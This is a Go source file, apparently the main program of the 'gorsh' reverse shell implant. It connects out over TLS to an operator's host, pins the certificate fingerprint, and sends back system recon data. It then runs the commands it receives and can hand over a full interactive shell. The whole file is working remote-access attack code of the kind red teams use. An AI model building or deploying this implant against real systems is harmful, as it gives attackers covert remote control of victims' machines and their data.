package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/audibleblink/gorsh/internal/commands"
	"github.com/audibleblink/gorsh/internal/shell"
	"github.com/audibleblink/gorsh/internal/sitrep"
)

const (
	ErrCouldNotDecode  = 1 << iota
	ErrHostUnreachable = iota
	ErrBadFingerprint  = iota
)

var connectString string
var fingerPrint string

type writer interface {
	Write(s []byte) (int, error)
	Read(s []byte) (int, error)
}

func send(conn writer, msg string) {
	conn.Write([]byte("\n"))
	conn.Write([]byte(msg))
	conn.Write([]byte("\n"))
}

func startShell(conn writer) {
	name, _ := os.Hostname()
	prompt := fmt.Sprintf("\n[%s]> ", name)
	scanner := bufio.NewScanner(conn)

	// Print basic recon data on first connect
	send(conn, sitrep.SysInfo())
	conn.Write([]byte(prompt))

	for scanner.Scan() {
		command := scanner.Text()
		switch command {
		case "exit":
			os.Exit(0)
		case "shell":
			cmd := shell.GetShell()
			cmd.Stdout = conn
			cmd.Stderr = conn
			cmd.Stdin = conn
			cmd.Run()
		default:
			argv := strings.Split(command, " ")
			out := commands.Route(argv)
			send(conn, out)
		}
		conn.Write([]byte(prompt))
	}
}

func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid
}

func initReverseShell(connectString string, fingerprint []byte) {
	config := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", connectString, config)
	if err != nil {
		os.Exit(ErrHostUnreachable)
	}
	defer conn.Close()

	ok := isValidKey(conn, fingerprint)
	if !ok {
		os.Exit(ErrBadFingerprint)
	}
	startShell(conn)
}

func main() {
	dev := flag.Bool("dev", false, "Run the shell locally")
	flag.Parse()

	if *dev {
		startShell(os.Stdin)
	}

	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ErrCouldNotDecode)
		}
		initReverseShell(connectString, bytesFingerprint)
	}
}
